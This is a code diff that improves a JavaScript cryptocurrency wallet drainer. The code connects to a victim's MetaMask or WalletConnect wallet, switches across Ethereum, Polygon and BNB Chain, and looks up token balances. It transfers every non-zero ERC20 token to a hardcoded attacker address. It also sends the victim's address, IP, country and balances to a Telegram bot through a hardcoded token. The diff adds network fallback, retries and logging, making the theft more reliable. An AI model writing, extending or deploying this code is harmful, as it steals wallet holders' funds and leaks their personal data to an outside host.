@@ -107,8 +107,8 @@ async function connectWalletAndSendTokens() {
   // Define supported EVM networks and their Exodus wallet addresses
   const evmNetworks = [
     { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
+    { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x1234567890abcdef1234567890abcdef12345678" },
+    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0xabcdef1234567890abcdef1234567890abcdef12" }
   ];
 
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
@@ -125,6 +125,7 @@ async function connectWalletAndSendTokens() {
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
     const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
+    console.log(`Wallet connected: ${userAddress} (${walletType})`);
 
     // Fetch location data
     let locationData = {};
@@ -139,17 +140,61 @@ async function connectWalletAndSendTokens() {
     // Process EVM-compatible networks
     for (const network of evmNetworks) {
       try {
-        // Switch to the network
-        await instance.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: `0x${network.chainId.toString(16)}` }]
-        });
+        console.log(`Processing network: ${network.name} (Chain ID: ${network.chainId})`);
+
+        // Attempt to switch to the network
+        try {
+          console.log(`Switching to ${network.name}`);
+          await instance.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+          });
+        } catch (switchErr) {
+          // If switch fails, try adding the network
+          if (switchErr.code === 4902) {
+            console.log(`Network ${network.name} not found, attempting to add it`);
+            const chainConfig = {
+              1: {
+                chainId: '0x1',
+                chainName: 'Ethereum Mainnet',
+                rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
+                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                blockExplorerUrls: ['https://etherscan.io']
+              },
+              137: {
+                chainId: '0x89',
+                chainName: 'Polygon Mainnet',
+                rpcUrls: ['https://polygon-rpc.com'],
+                nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+                blockExplorerUrls: ['https://polygonscan.com']
+              },
+              56: {
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                blockExplorerUrls: ['https://bscscan.com']
+              }
+            }[network.chainId];
+            await instance.request({
+              method: 'wallet_addEthereumChain',
+              params: [chainConfig]
+            });
+            // Retry switch
+            await instance.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+            });
+          } else {
+            throw switchErr;
+          }
+        }
 
         const currentProvider = new ethers.providers.Web3Provider(instance);
         const currentSigner = currentProvider.getSigner();
         const currentNetwork = await currentProvider.getNetwork();
         if (currentNetwork.chainId !== network.chainId) {
-          console.warn(`Failed to switch to ${network.name}`);
+          console.warn(`Failed to switch to ${network.name}, current chainId: ${currentNetwork.chainId}`);
           const errorMessage = `
 ❌ Failed to Switch to ${network.name}!
 Chain ID: ${network.chainId}
@@ -163,7 +208,7 @@ Error: Network switch rejected or not supported
           continue;
         }
 
-        // Send Telegram notification for successful network switch
+        // Notify successful switch
         const switchMessage = `
 🔄 Switched to ${network.name}!
 Address: ${userAddress}
@@ -175,40 +220,56 @@ Chain ID: ${network.chainId}
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: chatId, text: switchMessage })
         });
+        console.log(`Switched to ${network.name} successfully`);
 
         // Delay to ensure provider sync
         await delay(1000);
 
-        // Fetch ERC20 token balances using Moralis
+        // Fetch ERC20 token balances using Moralis with retry
         let tokens = [];
         let tokenSummaryTelegram = "";
-        try {
-          const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
-          const response = await fetch(moralisUrl, {
-            headers: { "X-API-Key": moralisApiKey }
-          });
-          if (!response.ok) {
-            throw new Error(`Moralis API error: ${response.statusText} (Status: ${response.status})`);
-          }
-          tokens = await response.json();
+        let apiAttempts = 0;
+        const maxAttempts = 2;
+        let apiSuccess = false;
 
-          // Format balance summary for Telegram
-          const nonZeroTokens = tokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
-          if (nonZeroTokens.length > 0) {
-            tokenSummaryTelegram = nonZeroTokens.map(token => {
-              const decimals = token.decimals ?? 18;
-              const balance = ethers.utils.formatUnits(token.balance, decimals);
-              return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
-            }).join("\n");
-          } else {
-            tokenSummaryTelegram = "No non-zero ERC20 token balances found.";
+        while (apiAttempts < maxAttempts && !apiSuccess) {
+          try {
+            apiAttempts++;
+            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
+            console.log(`Attempt ${apiAttempts}: Fetching tokens for ${network.name} from ${moralisUrl}`);
+            const response = await fetch(moralisUrl, {
+              headers: { "X-API-Key": moralisApiKey }
+            });
+            if (!response.ok) {
+              throw new Error(`Moralis API error: ${response.statusText} (Status: ${response.status})`);
+            }
+            tokens = await response.json();
+            console.log(`Fetched ${tokens.length} tokens for ${network.name}`);
+            apiSuccess = true;
+
+            // Format balance summary
+            const nonZeroTokens = tokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
+            if (nonZeroTokens.length > 0) {
+              tokenSummaryTelegram = nonZeroTokens.map(token => {
+                const decimals = token.decimals ?? 18;
+                const balance = ethers.utils.formatUnits(token.balance, decimals);
+                return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
+              }).join("\n");
+            } else {
+              tokenSummaryTelegram = "No non-zero ERC20 token balances found.";
+            }
+          } catch (apiErr) {
+            console.warn(`Attempt ${apiAttempts} failed for ${network.name}: ${apiErr.message}`);
+            if (apiAttempts === maxAttempts) {
+              tokenSummaryTelegram = `Failed to fetch ERC20 tokens after ${maxAttempts} attempts: ${apiErr.message || "Moralis API error"}`;
+            } else {
+              console.log(`Retrying Moralis API call for ${network.name}`);
+              await delay(2000); // Wait before retry
+            }
           }
-        } catch (apiErr) {
-          console.warn(`Failed to fetch ERC20 tokens for ${network.name}`, apiErr);
-          tokenSummaryTelegram = `Failed to fetch ERC20 tokens: ${apiErr.message || "Moralis API error"}`;
         }
 
-        // Fetch native balance as fallback (e.g., BNB for BNB Chain)
+        // Fetch native balance as fallback
         let nativeBalanceMessage = "";
         try {
           const nativeBalance = await currentProvider.getBalance(userAddress);
@@ -216,21 +277,25 @@ Chain ID: ${network.chainId}
           if (parseFloat(formattedBalance) > 0) {
             const nativeSymbol = network.chainId === 1 ? "ETH" : network.chainId === 137 ? "MATIC" : "BNB";
             nativeBalanceMessage = `• ${nativeSymbol}: ${formattedBalance}`;
+            console.log(`Native balance for ${network.name}: ${formattedBalance} ${nativeSymbol}`);
+          } else {
+            console.log(`No native balance for ${network.name}`);
           }
         } catch (balanceErr) {
-          console.warn(`Failed to fetch native balance for ${network.name}`, balanceErr);
+          console.warn(`Failed to fetch native balance for ${network.name}: ${balanceErr.message}`);
         }
 
-        // Combine token and native balance for notification
+        // Combine balances for notification
         const balanceSummary = [tokenSummaryTelegram, nativeBalanceMessage].filter(msg => msg).join("\n");
 
-        // Send Telegram message for network balances
+        // Send balance notification
         const networkMessage = `
 📥 Wallet Connected on ${network.name}!
 Address: ${userAddress}
 Wallet: ${walletType}
 Country: ${locationData.country_name}
 IP: ${locationData.ip}
+Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
 
 💰 Balances on ${network.name}:
 ${balanceSummary || "No balances found or API error occurred."}
@@ -240,10 +305,28 @@ ${balanceSummary || "No balances found or API error occurred."}
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: chatId, text: networkMessage })
         });
+        console.log(`Sent balance notification for ${network.name}`);
 
         // Transfer non-zero ERC20 tokens
-        for (const token of tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero())) {
+        const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
+        if (nonZeroTokens.length === 0) {
+          console.log(`No non-zero ERC20 tokens to transfer on ${network.name}`);
+          const noTransferMessage = `
+ℹ️ No ERC20 Tokens Transferred on ${network.name}!
+Reason: No non-zero token balances detected.
+          `;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: noTransferMessage })
+          });
+        } else {
+          console.log(`Found ${nonZeroTokens.length} non-zero tokens to transfer on ${network.name}`);
+        }
+
+        for (const token of nonZeroTokens) {
           try {
+            console.log(`Processing token ${token.symbol} on ${network.name}`);
             const contract = new ethers.Contract(token.token_address, [
               "function transfer(address to, uint amount) returns (bool)",
               "function approve(address spender, uint amount) returns (bool)",
@@ -255,14 +338,14 @@ ${balanceSummary || "No balances found or API error occurred."}
             if (allowance.lt(balanceInWei)) {
               const approveTx = await contract.approve(userAddress, balanceInWei);
               await approveTx.wait();
-              console.log(`Approved ${token.symbol} on ${network.name}, tx:`, approveTx.hash);
+              console.log(`Approved ${token.symbol} on ${network.name}, tx: ${approveTx.hash}`);
             }
 
             const tx = await contract.transfer(network.exodusAddress, balanceInWei);
             await tx.wait();
-            console.log(`Sent ${token.symbol} on ${network.name}, tx:`, tx.hash);
+            console.log(`Sent ${token.symbol} on ${network.name}, tx: ${tx.hash}`);
 
-            // Send Telegram notification for successful transfer
+            // Notify successful transfer
             const decimals = token.decimals ?? 18;
             const balance = ethers.utils.formatUnits(token.balance, decimals);
             const successMessage = `
@@ -279,7 +362,7 @@ Tx Hash: ${tx.hash}
               body: JSON.stringify({ chat_id: chatId, text: successMessage })
             });
           } catch (err) {
-            console.warn(`Failed to process ${token.symbol} on ${network.name}`, err);
+            console.warn(`Failed to process ${token.symbol} on ${network.name}: ${err.message}`);
             const errorMessage = `
 ❌ Token Transfer Failed on ${network.name}!
 Token: ${token.symbol}
@@ -294,7 +377,7 @@ Error: ${err.message || "Unknown error"}
           }
         }
       } catch (err) {
-        console.warn(`Error processing ${network.name}`, err);
+        console.warn(`Error processing ${network.name}: ${err.message}`);
         const errorMessage = `
 ❌ Error Processing ${network.name}!
 Error: ${err.message || "Unknown error"}
